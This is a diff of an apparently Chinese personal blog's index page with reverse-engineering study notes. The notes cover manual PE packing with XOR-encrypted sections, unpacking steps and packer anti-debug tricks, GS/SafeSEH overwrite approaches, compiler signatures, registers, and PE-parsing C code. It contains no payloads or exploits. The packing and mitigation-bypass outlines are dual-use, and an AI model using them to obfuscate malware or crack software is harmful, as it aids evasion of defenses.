@@ -157,6 +157,362 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-脱壳_手工加壳" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/05/脱壳_手工加壳/">加壳</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/10/05/脱壳_手工加壳/" class="archive-article-date">
+  	<time datetime="2018-10-05T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-05</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>壳代码基本流程</p>
+</blockquote>
+<p>1.保存寄存器环境<br>2.加载一些必要API<br>3.解密代码和数据<br>4.修复重定位<br>5.填充IAT<br>6.恢复寄存器环境</p>
+<blockquote>
+<p>手工加壳实例</p>
+</blockquote>
+<ul>
+<li>使用loadPE添加新的区段并修改区段信息<br><img src="http://picture.jbyusk.com:8080/dump/dump01.jpg" alt=""><br><img src="http://picture.jbyusk.com:8080/dump/dump02.jpg" alt=""></li>
+<li>使用010editor或者其他工具在新区段物理偏移地址开始位置填充区段大小的内容<br><img src="http://picture.jbyusk.com:8080/dump/dump03.jpg" alt=""></li>
+<li>在新区段写入新eop代码,并修改EOP地址为新的EOP地址<br><img src="http://picture.jbyusk.com:8080/dump/dump04.jpg" alt=""></li>
+<li>使用010加密比如使用xor加密,在汇编中对代码段解密,为了不处理重定向,取消随机地址<br><img src="http://picture.jbyusk.com:8080/dump/dump05.jpg" alt=""></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">脱壳</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/05/脱壳_手工加壳/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-脱壳基础01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/05/脱壳基础01/">脱壳基础01</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/10/05/脱壳基础01/" class="archive-article-date">
+  	<time datetime="2018-10-05T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-05</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>脱壳涉及PE文件格式,汇编指令分析,调试加密程序的还原<br>壳一般分2种,加密壳和压缩壳,使用技术:压缩算法,代码加密,iat加密,资源加密</p>
+<ul>
+<li>压缩算法<br>1.有损压缩<br>一个像素点:RGB红绿蓝<br>一个图片:(3,4,5),(4,5,3),(5,4,3)<br>压缩后:(4,4,4),3<br>2.无损压缩<br>一个文件:0,0,0,0,0,0,0<br>压缩后:0,7<blockquote>
+<p>脱壳目的</p>
+</blockquote>
+</li>
+</ul>
+<p>1.破解脱壳,解密,破解<br>2.杀毒引擎(脱壳引擎,反病毒虚拟机)解密,查杀病毒,扫描特征</p>
+<blockquote>
+<p>脱壳步骤</p>
+</blockquote>
+<ol>
+<li><p>找到原始OEP-寻址OEP技巧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.堆栈平衡法(ESP定律)</span><br><span class="line"> 壳代码就像函数，需要开辟堆栈,保存寄存器信息,退出时恢复堆栈,恢复寄存器。所以为了堆栈平衡,壳代码调用pushad之类的代码后,对堆栈设置访问和写入断点,然后运行程序,断点命中时,即为退出壳代码的时候.附近单点几次,即程序原始OEP</span><br><span class="line">2.特征定位法</span><br><span class="line"> 对于熟悉的程序可以使用特征来定位程序原始OEP</span><br><span class="line"> 二进制特征,API特征</span><br><span class="line">3.单步跟踪法</span><br><span class="line"> 分析自己加壳的程序或者练习分析壳时使用。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Dump内存到文件<br>使用OllyDump来dump文件，修正入口点地址</p>
+</li>
+<li>修复文件(常见修复IAT)<br>使用ImportREC来修复文件<br>修复前指向内存地址,修复后iat指向内容与int一致</li>
+</ol>
+<blockquote>
+<p>壳的加密技术</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.IAT加密</span><br><span class="line">2.对IAT加密流程进行混淆(使用自己的GetProcProcess函数,函数名称hash,花指令)</span><br><span class="line">3.对OEP入口,IAT调用进行改写</span><br><span class="line">4.反调试</span><br><span class="line">5.反虚拟机</span><br><span class="line">6.代码虚拟化</span><br><span class="line"></span><br><span class="line">1.IAT加密</span><br><span class="line">  在IAT表中存解密函数,解密函数中获得真实的函数地址</span><br><span class="line">  解决办法:在壳中找到获取真是地址的位置以及填充的位置,可以直接修改汇编或者写od脚本</span><br><span class="line">2.IAT加密流程混淆</span><br><span class="line">  无解,都是经验</span><br><span class="line">3.对OEP入口,IAT调用进行改写</span><br><span class="line">  无解,都是经验</span><br><span class="line">4. 反调试</span><br><span class="line">  +反硬件调试</span><br><span class="line">   异常回调中将调试寄存器清0</span><br><span class="line">   SetThreadContext以及这个函数的下层函数</span><br><span class="line">   SetUnhandledExceptionFilter设置顶层异常函数</span><br><span class="line">  +反软件调试</span><br><span class="line">   判断是否有CC</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">脱壳</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/05/脱壳基础01/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-漏洞利用原理高级" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/29/漏洞利用原理高级/">漏洞利用原理高级</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/09/29/漏洞利用原理高级/" class="archive-article-date">
+  	<time datetime="2018-09-29T07:28:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-29</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>GS编译技术<br>一般在[esp-4]之前加入Security Cookie(esp Xor .data区第一个4字节数据),函数返回前首先检测Security Cookie是否覆盖,从而把针对操作系统的栈溢出变的困难。<br>覆盖虚函数地址/异常处理地址覆盖/直接覆盖种子以及Security Cookie<br>+SafeSEH<br>调用RtlIsValidHandle()函数校验<br>1.异常处理函数位于加载模块内存范围之外,且dep关闭<br>2.异常处理函数位于加载模块内存范围之内,未启用SafeSEH,且模块不是纯IL<br>3.异常处理函数位于加载模块内存范围之内,相应模块启用SafeSEH,异常处理函数地址包含再安全S.E.H表中<br>4.S.E.H中的异常函数指针指向堆区</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/29/漏洞利用原理高级/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-看书得角度转变" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/15/看书得角度转变/">看书的角度转变</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/09/15/看书得角度转变/" class="archive-article-date">
+  	<time datetime="2018-09-15T00:11:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-15</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>以前看书喜欢跟随作者的思路,自然而然的去享受书的发展。现在看书喜欢带着多角度,辩证的角度去看书。不喜欢把一切都归咎于艺术的表现方式就去接受，或者是为了让感动连贯就不去反驳。因为我一直认为一个观点认可了，就会在大脑里形成意识，说不定在未来的某个时刻就成为了阻扰你做出决定的因素。虚虚假假真真实实又有几个人辨别得清,现实的作者写出虚幻的世界，成为了现实读者指导生活的准则。就比如以前小说里总是这样描述:当一个人的喜欢不被接受,最喜欢的写法就是将喜欢转为暗地里默默的支持与祝福，这样的喜欢有种淡淡的忧伤,让人感动。但是如果这种事情真的发生在自己的身上,不因爱生恨就已经是极好,竟然还能默默喜欢并真心的祝福。不过,这种书的情节多了,或许就会有人真的认可这种说法并且去实践也说不定。人类创造了语言和文字,然后创造的语言和文字又在循环的影响着后来人的行为和举止。有时候也分不清哪些是现实的延伸,哪些是幻想的延伸。总归来说,我还是比较赞同以多角度去看书,以自己的角度,以别人的角度,以旁观人的角度,添加了时间和空间的角度等等,从中选择出一个自己最认可的观点。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">思考</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/15/看书得角度转变/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
     <article id="post-异常分发原理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -385,189 +741,6 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-逆向基础02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/逆向基础02/">逆向基础02-编译器特征</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/逆向基础02/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>EXEINFO与PEID的原理<br>查壳或者查询编译语言使用特征<br>1.OEP特征<br>2.链接器特征<br>3.人肉查找的时候,查看区段名称</p>
-</blockquote>
-<h3 id="BC"><a href="#BC" class="headerlink" title="BC++"></a>BC++</h3><ol>
-<li>OEP特征<br><img src="http://picture.jbyusk.com:8080/res/BC++.png" alt=""><br>二进制特征:EB 10 66 62 3A 43 2B 2B 48 4F 4B<br>第一个调用的API是GetModHandleA</li>
-<li>链接器版本<br>5.00</li>
-<li>区段名称<br><img src="http://picture.jbyusk.com:8080/res/BC++1.png" alt=""></li>
-</ol>
-<h3 id="delphi"><a href="#delphi" class="headerlink" title="delphi+"></a>delphi+</h3><ol>
-<li>OEP特征<br><img src="http://picture.jbyusk.com:8080/res/delphi1.png" alt=""><br>二进制特征:55 8B EC 83 C4 F0 B8 ?? ?? ?? ?? E8<br>OEP处有5个CALL调用,第一个API调用是GetModuleHandleA<br>第一个调用的API是GetModHandleA</li>
-<li>链接器版本<br>2.25</li>
-<li>区段名称<br><img src="http://picture.jbyusk.com:8080/res/delphi2.png" alt=""></li>
-</ol>
-<h3 id="VC6-0-amp-易语言"><a href="#VC6-0-amp-易语言" class="headerlink" title="VC6.0 &amp; 易语言"></a>VC6.0 &amp; 易语言</h3><ol>
-<li>OEP特征<br><img src="http://picture.jbyusk.com:8080/res/yilan1.png" alt=""><br>二进制特征:55 8B EC 6A FF 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 58<br>OEP处开辟堆栈空间是sub esp,0x58<br>OEP处API调用GetVersion<br>第一个调用的API是GetModHandleA</li>
-<li>链接器版本<br>6.0</li>
-<li>区段名称<br><img src="http://picture.jbyusk.com:8080/res/yilan2.png" alt=""></li>
-</ol>
-<h3 id="VS程序的链接器版本"><a href="#VS程序的链接器版本" class="headerlink" title="VS程序的链接器版本"></a>VS程序的链接器版本</h3><p>VC 6.0 6.0<br>VC2003 7.0，7.1<br>VS2005 8.0<br>VS2008 9.0<br>VS2010 10.0<br>VS2012 11.0<br>VS2013 12.0<br>VS2015 14.0<br>VS2017 14.1</p>
-<ul>
-<li>VS2013 main函数特征<br>1.二进制特征<br>50 E8 ???????? 8B 00 50 E8 ???????? 8B 08 51 E8</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/逆向基础02/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-汇编1_寄存器" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/汇编1_寄存器/">汇编学习1寄存器</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/汇编1_寄存器/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>CPU寄存器</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">通用寄存器:</span><br><span class="line">32位:</span><br><span class="line">EAX,EBX,ECX,EDX</span><br><span class="line">ESI:源变址寄存器</span><br><span class="line">EDI:目的变址寄存器</span><br><span class="line">ESP:栈顶指针</span><br><span class="line">EBP:栈底指针</span><br><span class="line">16位:</span><br><span class="line">AX,BX,CX,DX</span><br><span class="line">SI,DI,SP,BP</span><br><span class="line">8位:</span><br><span class="line">AH,AL,BH,BL,CH,CL,DH,DL</span><br><span class="line"></span><br><span class="line">指令指针寄存器:EIP,IP 与CS联用指向下一个指令的物理地址</span><br><span class="line"></span><br><span class="line">标志位寄存器FLAGS</span><br><span class="line">状态标志</span><br><span class="line">0 CF 进位标志    进位或借位置1，否则置0    无符号是有效</span><br><span class="line">2 PF 奇偶标志    低8位 1的个数，奇数个为0，偶数个为1</span><br><span class="line">4 AF 辅助标志    低半字节是否有进位或借位</span><br><span class="line">6 ZF 零标志        结果是0置1，否则置0    </span><br><span class="line">7 SF 符号标志    最高位为1则置1，否则置0</span><br><span class="line">11 OF 溢出标志   溢出OF为1，否则为0    有符号数运算是否超出范围</span><br><span class="line">控制标志</span><br><span class="line">8 TF 陷阱标志   TF=0，处理器正常工作，TF=1，处理器单步执行指令</span><br><span class="line">9 IF 中断标志    IF=1 允许中断，IF=0，禁止中断 CLI(IF=0) STI(IF=1)</span><br><span class="line">10 DF 方向标志 DF=0 存储器地址自动增加 DF=1 存储器地址自动减少</span><br><span class="line"></span><br><span class="line">段寄存器:</span><br><span class="line">CS:代码段的起始位置</span><br><span class="line">DS:数据段的起始位置</span><br><span class="line">ES:附加段的起始位置</span><br><span class="line">SS:堆栈段的起始位置</span><br><span class="line">没有指明情况下，数据访问在DS段,BP访问内存在SS段</span><br><span class="line">段超越: 一般数据访问(DS)，BP基址的寻址方式(SS)，串操作的源操作数(DS)</span><br><span class="line">	可以使用（段寄存器:）实现超越</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">汇编</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/汇编1_寄存器/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
     <article id="post-dll文件的导出和调用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -680,20 +853,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-逆向分析方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-PE文件编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/逆向分析方法/">逆向分析方法</a>
+      <a class="article-title" href="/2018/08/20/PE文件编程/">PE文件编程</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/逆向分析方法/" class="archive-article-date">
+        <a href="/2018/08/20/PE文件编程/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -702,13 +875,34 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ol>
-<li>自上而下的分析<br>从程序入口点开始分析,模拟程序运行的整个流程,对程序进行分析</li>
-<li>自下而上分析<br>找到关键API,栈回溯分析,比如程序弹出MessageBoxA/W，从弹框栈回溯分析找到窗口回调函数,从窗口回调函数开始分析</li>
-<li>字符串分析<br>根据弹窗提示的字符串,再调试器中查找,定位关键代码,再分析<br>根据调试时查看到的第三方库的版本号<br>比如:加密通讯库openssl  嵌入式脚本lua</li>
-<li>源码对比分析<br>分析源码特征,然后去调试分析<br>5.假设某一个函数的内部复杂,可以在成功调用函数的代码处,不停调用目标函数,构造类似参数,从返回值,传出参数来判断函数的功能。</li>
-</ol>
-<p>分析心态:分析过程中不停猜测程序的意图和流程</p>
+        <blockquote>
+<p>读取文件</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">char* ReadFileToMem(char *pFilePath) &#123;</span><br><span class="line">	HANDLE hFile = CreateFileA(pFilePath,</span><br><span class="line">		GENERIC_READ,</span><br><span class="line">		NULL,</span><br><span class="line">		NULL,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		NULL</span><br><span class="line">		);</span><br><span class="line">	if (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		printf(&quot;File open failed\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	//获取文件大小</span><br><span class="line">	DWORD dwFileSize = GetFileSize(hFile, NULL);</span><br><span class="line">	//申请空间</span><br><span class="line">	char *pFileBuf = new char[dwFileSize];</span><br><span class="line">	//读文件</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	BOOL bRet = ReadFile(hFile, pFileBuf, dwFileSize, &amp;dwRead, NULL);</span><br><span class="line">	if (bRet) &#123;</span><br><span class="line">		return pFileBuf;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>判断是否是PE文件</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BOOL IsPeFile(char *pFileBuf) &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pFileBuf;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pFileBuf);</span><br><span class="line">	if (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE || pNt-&gt;Signature != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">		printf(&quot;file is not pe\n&quot;);</span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>RVA to FOA</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DWORD RVAtoFOA(DWORD dwRVA, char* pBase) &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pBase);</span><br><span class="line">	//获取区段个数</span><br><span class="line">	DWORD dwSectionCount = pNt-&gt;FileHeader.NumberOfSections;</span><br><span class="line">	//获取第一个区段表的地址</span><br><span class="line">	PIMAGE_SECTION_HEADER pSec1= IMAGE_FIRST_SECTION(pNt);</span><br><span class="line">	//循环比对地址落在哪个区段内</span><br><span class="line">	for (DWORD i = 0; i &lt; dwSectionCount; i++) &#123;</span><br><span class="line">		if (dwRVA &gt;= pSec1-&gt;VirtualAddress &amp;&amp; dwRVA &lt;= (pSec1-&gt;VirtualAddress +</span><br><span class="line">			pSec1-&gt;SizeOfRawData)) &#123;</span><br><span class="line">			return dwRVA - </span><br><span class="line">				pSec1-&gt;VirtualAddress + </span><br><span class="line">				pSec1-&gt;PointerToRawData;</span><br><span class="line">		&#125;</span><br><span class="line">		//下一个区段地址</span><br><span class="line">		pSec1++;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>显示PE文件中的一些重要字段</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void ShowImportantData(char *pFile) &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pFile;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pFile);</span><br><span class="line">	//加载基址</span><br><span class="line">	printf(&quot;加载基址:0x%X\n&quot;, pNt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">	//OEP 入口点</span><br><span class="line">	printf(&quot;OEP 入口点:0x%X\n&quot;, pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">	//文件属性</span><br><span class="line">	printf(&quot;文件属性:0x%X\n&quot;, pNt-&gt;FileHeader.Characteristics);</span><br><span class="line">	//32bit或者是64bit</span><br><span class="line">	printf(&quot;文件特性:%s\n&quot;, pNt-&gt;OptionalHeader.Magic==0x10B?&quot;32位&quot;:&quot;64位&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>导出表</p>
+</blockquote>
